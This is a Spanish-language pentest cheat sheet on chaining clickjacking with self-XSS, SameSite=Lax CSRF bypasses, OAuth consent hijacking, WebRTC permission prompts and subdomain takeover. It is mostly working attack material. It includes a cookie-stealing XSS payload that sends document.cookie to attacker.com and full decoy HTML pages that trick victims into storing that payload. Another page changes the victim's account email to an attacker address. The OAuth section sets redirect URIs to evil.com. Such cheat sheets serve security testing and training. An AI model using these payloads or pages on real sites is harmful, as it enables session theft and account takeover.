---
aliases:
  - Clickjacking Chains
  - UI Redress Chains
  - Self-XSS to Stored
  - SameSite Lax Bypass
tags:
  - type/cheatsheet
  - vuln/clickjacking
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[Clickjacking]]"
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[OAuth 2.0 Misconfigurations]]"
  - "[[Subdomain Takeover]]"
---
# Clickjacking - Chains con Otras Vulns

***

## Self-XSS → Stored XSS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Self-XSS aislado no escala (víctima debe ejecutar payload en su propia sesión). Clickjack del submit lo convierte en stored. | Amplificación. |
| Pre-fill via URL params | `?bio=<svg/onload=fetch('//evil/?'+document.cookie)>` | Server reflecta input. |
| Iframe con form pre-rellenado | `<iframe src="victim.com/profile?bio=PAYLOAD" style="opacity:0.01">` | Render invisible. |
| Decoy "Click para premio" | Botón visible debajo del submit del iframe | UI illusion. |
| Submit forzado via clickjack | Click va al submit del iframe → bio guardado con XSS | Stored. |
| Trigger en otros usuarios | XSS dispara cuando admin/users ven perfil víctima | Persistencia + escalation. |
| Reflected XSS POST + CSRF token | Iframe con form auto-submit + click forzado en confirm | Token leakeable via referer. |
| DOM XSS via postMessage | Iframe controlled envía postMessage tras click | Client-side RCE. |
| XSS en admin panel | Clickjack admin para hacer click en link malicioso | Admin ejecuta payload. |
| Combine con `srcdoc` iframe | `<iframe srcdoc="<form...">` evade SOP | Same-origin abuse. |
| Multi-step submit | Multiple clicks (form + confirm) | Complex chain. |
| GraphQL mutation pre-fill | Pre-rellenar variables vía URL | API stored XSS. |
^cj-chain-xss

### Workflow Self-XSS → Stored

```html
<!DOCTYPE html>
<html>
<head>
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.001; z-index:2; }
  .decoy { position:absolute; top:200px; left:300px; z-index:1; padding:20px; background:red; color:white; }
</style>
</head>
<body>
  <div class="decoy">¡PREMIO! Click para reclamar</div>
  <!-- Pre-fill bio con XSS payload reflejado, click forzado guarda -->
  <iframe src="https://victim.com/profile/edit?bio=%3Csvg%2Fonload%3Dfetch(%27%2F%2Fattacker.com%2Fc%3F%27%2Bdocument.cookie)%3E"></iframe>
</body>
</html>
```

___

## SameSite=Lax CSRF Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | `SameSite=Lax` bloquea cross-site POST pero permite top-level GET nav. Clickjack dispara nav top-level → cookies fluyen. | Bypass principal Lax. |
| GET endpoint sensible | `/account/delete?confirm=true` | Endpoint vulnerable. |
| Form con `target="_top"` | Iframe POST a top context → cookies viajan | Top-level nav hack. |
| `window.open()` desde iframe | Click forzado abre nueva tab top-level | Lax permite. |
| `<a target="_blank">` clickjack | Anchor click fuerza nav | Same. |
| `<meta http-equiv=refresh>` post-click | Redirect post-form-submit | Multi-step. |
| `SameSite=None` legacy cookies | Iframe + POST normal funciona | Sin trucos necesarios. |
| `SameSite=Strict` no bypass | Strict bloquea hasta top-level | Solo XSS chain salva. |
| Doble Submit Cookie sin token check | Form auto-submit + click | Token leakeable via referer. |
| Password change sin re-auth | Clickjack del confirm | ATO directo. |
| Email change sin re-auth | Idem | Account hijack. |
| MFA disable toggle | Clickjack del switch | MFA bypass. |
^cj-chain-csrf

### Workflow SameSite=Lax bypass

```html
<form action="https://victim.com/email/change" method="POST" target="topnav">
  <input name="email" value="atacker@evil.com">
  <input type="submit" id="hidden-submit">
</form>
<iframe name="topnav" style="opacity:0.001;position:absolute;z-index:2;width:100%;height:100%"></iframe>
<button class="decoy" style="position:absolute;top:200px;left:300px;z-index:1">Click ganador</button>
<script>
  // Submit fuerza top-level nav porque target=topnav y target=_top en click
  document.querySelector('.decoy').onclick = () => document.forms[0].submit();
</script>
```

___

## OAuth Consent Hijacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | OAuth `/authorize` endpoints frecuentemente frameables (no XFO/CSP). Clickjack del "Authorize" → atacante recibe code/token. | OAuth ATO chain. |
| Endpoint frameable | `curl -sI /oauth/authorize \| grep -iE 'x-frame\|frame-ancestors'` | Detection. |
| Atacante's `client_id` | `?client_id=ATACANTE&redirect_uri=evil.com&response_type=code` | Atacante registró su client. |
| Click forzado "Authorize" | Botón decoy debajo del consent button | UI overlay. |
| Code arriba a `redirect_uri` | Atacante recibe code víctima | Direct theft. |
| Implicit flow `response_type=token` | Token directo en fragment | Sin exchange. |
| Scope upgrade silent | Re-consent ya granted scopes + new admin scope | Silent escalation. |
| Pre-consented apps | Click solo abre redirect (no UI confirmación) | Trivial chain. |
| Logout + re-auth | Clickjack del re-login flow | Cookie reuse. |
| `display=popup` clickjack | Popup OAuth con clickjack en custom UI | Mobile-friendly. |
| `prompt=none` silent | Si víctima ya logged en IdP → silent grant | No UI alert. |
| Major IdPs mitigaron | Google/Microsoft/GitHub setean XFO en /authorize | Custom apps expuestas. |
^cj-chain-oauth

___

## WebRTC getUserMedia Hijack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Clickjack del prompt "Allow camera/mic" en custom permission UIs (no en prompt nativo browser, no frameable cross-origin). | Hardware abuse. |
| Browser nativo bloqueado | Chrome/Firefox bloquean `getUserMedia` prompt en iframes cross-origin desde 2022 | Limitación. |
| Custom permission UI | Apps con "Enable Camera" button propio antes del prompt nativo | Vector real. |
| Jitsi/BBB/Zoom web join | Clickjack del "Join with video" | Cam activa en sala atacante. |
| `getDisplayMedia` screen share | Clickjack del "Share screen" | Captura pantalla. |
| Re-permission tras revoke | Click forzado re-grant sin awareness | Silent re-enable. |
| Bluetooth/USB Web APIs | Clickjack permission | Pairing forzado. |
| `Permissions-Policy` header | Defensa moderna (`camera=()` deny) | Mitigation. |
| Mobile webview | Diferentes restrictions vs browser | Edge cases. |
| Combine con scroll-jacking | Force scroll a position click prompt | Multi-step. |
| TouchID/FaceID prompts | Mobile native — no clickjackable | Out of scope. |
| Google Meet etc | Major apps mitigaron con prompt nativo | Custom apps en riesgo. |
^cj-chain-webrtc

___

## Subdomain Takeover Trust Transfer

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Atacante reclama subdomain (CNAME dangling) → mismo eTLD+1 que víctima → bypass `frame-ancestors 'self'` y `*.victim.com`. | Trust transfer. |
| Recon CNAMEs dangling | `subjack`, `nuclei -t takeovers/`, `dnsx` | Discovery. |
| Reclaim Heroku/S3/GitHub Pages | Crear app/bucket/repo con nombre target | Ownership. |
| Bypass CSP `frame-ancestors 'self'` | Sub-origin permitido (mismo eTLD+1) | CSP bypass. |
| Bypass CSP `frame-ancestors *.victim.com` | Wildcard explícito permite | Trivial post-takeover. |
| Cookies SameSite scope | Cookies `domain=.victim.com` fluyen al subdomain atacante | Leak vector. |
| Storage Access API cross-subdomain | Acceso storage víctima desde subdomain | Data theft. |
| OAuth `redirect_uri=*.victim.com` | Si IdP wildcards → atacante registra subdomain | OAuth combo. |
| Cookie tossing | Set cookie atacker subdomain → flow upstream | Session fixation. |
| Email DKIM/SPF inheritance | Subdomain heredar DKIM | Email spoofing combo. |
| Internal monitoring evade | Subdomain whitelisted en internal tools | Bypass guardrails. |
| HSTS bypass | Subdomain sin HSTS si no `includeSubDomains` | Downgrade attack. |
^cj-chain-subtakeover

***
